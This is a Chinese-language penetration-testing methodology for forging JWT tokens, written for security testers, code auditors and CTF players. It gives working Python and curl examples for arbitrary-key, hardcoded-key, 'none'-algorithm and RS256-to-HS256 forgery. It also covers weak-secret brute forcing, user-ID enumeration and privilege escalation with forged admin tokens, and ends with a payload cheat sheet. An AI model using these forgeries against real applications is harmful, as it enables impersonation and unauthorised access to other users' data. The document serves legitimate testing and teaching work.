# JWT 令牌伪造攻击方法论

## 第一部分：文档概述

### 1.1 编写目的
本文档为渗透测试人员提供一套标准化、可复现的 JWT 令牌伪造攻击流程，用于检测和利用 JWT 认证机制中的签名验证缺陷。通过系统性的方法论，确保测试人员能够高效地发现 JWT 配置错误并实现权限提升。

### 1.2 适用范围
本文档适用于以下场景：
- JWT 签名验证被禁用或配置错误的应用
- 使用弱密钥或硬编码密钥的 JWT 实现
- 未正确验证 JWT 声明（claims）的认证系统
- Flask/Python 应用使用 PyJWT 库的 JWT 实现
- CTF 挑战中涉及 JWT 认证的场景

### 1.3 读者对象
- 执行渗透测试的安全工程师
- 进行代码审计的安全分析师
- CTF 竞赛参与者
- 负责认证系统开发的开发人员

---

## 第二部分：核心渗透技术专题

### 专题一：JWT 令牌伪造攻击

#### 2.1 技术介绍

JWT（JSON Web Token）是一种开放标准（RFC 7519），用于在网络应用环境间安全地传输信息。当 JWT 签名验证被禁用或配置错误时，攻击者可以伪造任意 JWT 令牌，实现身份冒充和权限提升。

**漏洞本质：**
- 应用未验证 JWT 签名，信任客户端提供的任意 JWT
- 应用使用弱密钥或硬编码密钥，可被暴力破解或直接从源码获取
- 应用未验证 JWT 声明（如 `user_id`、`role`）与服务器端会话的一致性

**攻击原理：**
```
正常流程：
客户端 → 登录 → 服务器签名 JWT → 客户端存储 → 请求携带 JWT → 服务器验证签名 → 返回资源

攻击流程：
客户端 → 登录 → 获取合法 JWT → 修改 payload → 伪造签名 → 请求携带伪造 JWT → 服务器跳过验证 → 返回他人资源
```

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户认证系统 | 登录/登出、会话管理 | JWT 签名验证被禁用，可伪造任意用户身份 |
| 权限管理系统 | 角色切换、资源访问 | JWT 中的 `role` 或 `permissions` 字段可篡改 |
| API 认证 | RESTful API、GraphQL | API 仅验证 JWT 存在性，不验证签名 |
| 微服务架构 | 服务间认证 | 服务间信任客户端提供的 JWT，未二次验证 |
| CTF 挑战 | 权限提升、Flag 获取 | 故意配置错误的 JWT 验证，供参赛者利用 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**步骤 1：获取合法 JWT 令牌**
```bash
# 登录获取 JWT
curl -X POST http://target/login \
  -d "username=test&password=test" \
  -c cookies.txt

# 提取 JWT
cat cookies.txt | grep auth_token
```

**步骤 2：检测签名验证状态**
```python
import jwt

# 方法 1：使用空签名
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxfQ."
# 如果服务器接受，说明签名验证被禁用

# 方法 2：修改 payload 但保留原签名
original = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxfQ.signature"
modified = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDB9.signature"
# 如果服务器接受修改后的 token，说明签名未验证
```

**步骤 3：检测算法混淆攻击**
```python
import jwt

# 尝试将算法改为 None
payload = {"user_id": 1, "role": "admin"}
none_token = jwt.encode(payload, None, algorithm=None)

# 尝试将 HS256 改为 RS256（公钥当作私钥）
public_key = open("public.pem").read()
forged_token = jwt.encode(payload, public_key, algorithm="HS256")
```

##### 2.3.2 白盒测试

**代码审计要点：**

1. **查找 JWT 解码位置**
```bash
# Python/Flask
grep -r "jwt.decode" .
grep -r "PyJWT" .

# Node.js
grep -r "jwt.verify" .
grep -r "jsonwebtoken" .

# Java
grep -r "Jwts.parser" .
grep -r "JwtParser" .
```

2. **检查签名验证配置**
```python
# 危险配置示例
jwt.decode(token, options={'verify_signature': False})  # 签名验证被禁用
jwt.decode(token, verify=False)  # 完全禁用验证
jwt.decode(token, algorithms=None)  # 未指定算法
```

3. **检查密钥管理**
```python
# 危险配置示例
SECRET_KEY = 'your_secret_key'  # 弱密钥
SECRET_KEY = 'this_is_the_secret_key_for_the_json_token'  # 硬编码密钥
app.config['AUTH_SECRET_KEY'] = 'hardcoded_secret'  # 配置文件中硬编码
```

#### 2.4 漏洞利用方法

##### 2.4.1 基础信息收集

**获取 JWT 结构：**
```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs"

# 解码（不验证签名）
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)
# 输出：{'username': 'test', 'user_id': 10032, 'user_type': 'customer'}
```

**识别目标用户 ID：**
```bash
# 通过页面响应获取用户 ID
curl http://target/dashboard | grep -o 'user_id.*value="[0-9]*"'

# 通过枚举获取用户 ID
for i in {1..100}; do
  curl -H "Cookie: auth_token=$FORGED_JWT" http://target/user/$i
done
```

##### 2.4.2 伪造 JWT 令牌

**方法 1：任意密钥伪造（签名验证被禁用）**
```python
import jwt

# 目标 payload
forged_payload = {
    "username": "attacker",
    "user_id": 10019,  # 目标用户 ID（如 flag 用户）
    "user_type": "customer"
}

# 使用任意密钥签名（因为签名验证被禁用）
forged_token = jwt.encode(forged_payload, "wrong_secret", algorithm="HS256")
print(forged_token)
```

**方法 2：硬编码密钥伪造**
```python
import jwt

# 从源码或配置中获取的硬编码密钥
SECRET_KEY = "this_is_the_secret_key_for_the_json_token"

# 伪造管理员权限
admin_payload = {
    "username": "attacker",
    "user_id": 1,
    "user_type": "admin",
    "role": "administrator"
}

admin_token = jwt.encode(admin_payload, SECRET_KEY, algorithm="HS256")
```

**方法 3：算法混淆攻击（None 算法）**
```python
import jwt

# 使用 None 算法（无签名）
none_payload = {"user_id": 1, "role": "admin"}
none_token = jwt.encode(none_payload, None, algorithm=None)
print(none_token)
```

**方法 4：算法替换攻击（RS256 → HS256）**
```python
import jwt

# 如果服务器使用 RS256（非对称加密），但接受 HS256
# 可以用公钥作为 HS256 的密钥
public_key = open("public.pem").read()

hs256_payload = {"user_id": 1, "admin": True}
hs256_token = jwt.encode(hs256_payload, public_key, algorithm="HS256")
```

##### 2.4.3 利用伪造 JWT 访问资源

**水平权限提升（IDOR）：**
```bash
# 使用伪造的 JWT 访问他人数据
curl http://target/dashboard \
  -H "Cookie: session=VALID_SESSION; auth_token=$FORGED_JWT"

# 预期响应：显示目标用户的敏感信息（如 CTF Flag）
```

**垂直权限提升：**
```bash
# 使用伪造的管理员 JWT 访问管理功能
curl http://target/admin/users \
  -H "Cookie: auth_token=$ADMIN_FORGED_JWT"

# 预期响应：显示管理员界面或执行特权操作
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过 JWT 验证逻辑

**绕过方法 1：签名验证禁用检测**
```python
# 如果服务器使用以下配置：
# jwt.decode(token, options={'verify_signature': False})

# 则任何签名都会被接受，直接用任意密钥伪造
```

**绕过方法 2：密钥爆破**
```python
import jwt
from itertools import product

# 常见弱密钥列表
weak_secrets = [
    'secret', 'password', '123456', 'your_secret_key',
    'this_is_the_secret_key', 'jwt_secret', 'auth_key'
]

for secret in weak_secrets:
    try:
        decoded = jwt.decode(token, secret, algorithms=['HS256'])
        print(f"Found secret: {secret}")
        break
    except jwt.InvalidSignatureError:
        continue
```

##### 2.5.2 绕过会话一致性检查

**场景：服务器同时检查 session 和 JWT**
```python
# 1. 先获取合法 session
session = requests.Session()
session.post("http://target/login", data={"username": "test", "password": "test"})

# 2. 替换 JWT 为伪造的
forged_jwt = jwt.encode({"user_id": 10019}, "any_secret", algorithm="HS256")
session.cookies.set('auth_token', forged_jwt)

# 3. 访问目标资源（session 有效 + JWT 伪造成功）
response = session.get("http://target/dashboard")
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 类别 | 目标/环境 | Payload 示例 | 说明 |
|-----|---------|------------|------|
| 签名绕过 | 签名验证禁用 | `jwt.encode(payload, "any", "HS256")` | 任意密钥签名 |
| 签名绕过 | None 算法 | `jwt.encode(payload, None, algorithm=None)` | 无签名 JWT |
| 算法替换 | RS256 → HS256 | `jwt.encode(payload, public_key, "HS256")` | 公钥作私钥 |
| 水平提升 | IDOR | `{"user_id": 10019}` | 修改为用户 ID |
| 垂直提升 | 角色提升 | `{"role": "admin", "is_admin": true}` | 提升为管理员 |
| 信息收集 | 解码 JWT | `jwt.decode(token, options={"verify_signature": False})` | 查看 payload |

### 3.2 JWT 攻击工具

**在线工具：**
- [jwt.io](https://jwt.io/) - JWT 解码/编码/调试
- [jwt.ms](https://jwt.ms/) - Microsoft JWT 调试工具

**命令行工具：**
```bash
# jwt-cmd (Node.js)
npm install -g jwt-cmd
jwt decode $TOKEN

# jwt-tool (Python)
pip install jwt-tool
python3 jwt-tool.py $TOKEN -C -p common-passwords.txt
```

**Python 库：**
```python
import jwt  # PyJWT
import jose  # python-jose
```

### 3.3 参考资源

- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [JWT Attack Playbook](https://github.com/ticarpi/jwt-tool)
- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月 14 日  
**适用技能：** authentication-failures, broken-access-control
